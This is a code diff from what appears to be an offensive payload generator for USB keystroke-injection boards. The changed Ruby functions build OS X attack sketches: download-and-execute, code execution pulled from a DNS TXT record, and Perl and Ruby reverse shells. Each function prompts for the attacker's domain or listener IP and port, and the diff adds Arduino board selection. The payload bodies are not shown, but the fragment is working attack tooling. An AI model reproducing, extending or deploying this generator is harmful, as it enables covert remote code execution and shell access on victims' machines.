+    search_replace("./lib/src/osx_download_exec.ino","#$output_path/output/osx_download_exec.ino",url)
+  end
 end
 
 def osx_dns_txt_codeexec()
   puts"\nThis payload downloads code from a DNS TXT record and executes it using xxd.".bold
   puts"\nThe TXT record must be Base64 encoded. A good example could be using a perl one liner, base64 encoded."
   domain = input("Enter the domain whose TXT record will serve shellcode/command : ")
-  search_replace("./lib/src/osx_dns_txt_codeexec.ino","#$output_path/output/osx_dns_txt_codeexec.ino",domain)
+  $board = boardtype()
+  if ($board == "4")
+    search_replace("./lib/src/arduino/osx_dns_txt_codeexec.ino","#$output_path/output/osx_dns_txt_codeexec.ino",domain)
+  else
+    search_replace("./lib/src/osx_dns_txt_codeexec.ino","#$output_path/output/osx_dns_txt_codeexec.ino",domain)
+  end
 end
 
 def osx_perl_reverse_shell()
@@ -598,8 +842,12 @@ def osx_perl_reverse_shell()
   puts"\nPerl comes installed by default in OS X Lion."
   ip = input("Enter the IP address of the machine where the listener is running: ")
   port = input("Enter the port number on which the listener is listening (use port > 1024): ")
-  search_replace("./lib/src/osx_perl_reverse_shell.ino","#$output_path/output/osx_perl_reverse_shell.ino",ip, port)
-
+  $board = boardtype()
+  if ($board == "4")
+    search_replace("./lib/src/arduino/osx_perl_reverse_shell.ino","#$output_path/output/osx_perl_reverse_shell.ino",ip, port)
+  else
+    search_replace("./lib/src/osx_perl_reverse_shell.ino","#$output_path/output/osx_perl_reverse_shell.ino",ip,port)
+  end
 end
 
 def osx_ruby_reverse_shell()
@@ -607,5 +855,10 @@ def osx_ruby_reverse_shell()
   puts"\nRuby comes installed by default in OS X Lion."
   ip = input("Enter the IP address of the machine where the listener is running: ")
   port = input("Enter the port number on which the listener is listening (use port > 1024): ")
-  search_replace("./lib/src/osx_ruby_reverse_shell.ino","#$output_path/output/osx_ruby_reverse_shell.ino",ip, port)
+  $board = boardtype()
+  if ($board == "4")
+    search_replace("./lib/src/arduino/osx_ruby_reverse_shell.ino","#$output_path/output/osx_ruby_reverse_shell.ino",ip, port)
+  else
+    search_replace("./lib/src/osx_ruby_reverse_shell.ino","#$output_path/output/osx_ruby_reverse_shell.ino",ip,port)
+  end
 end
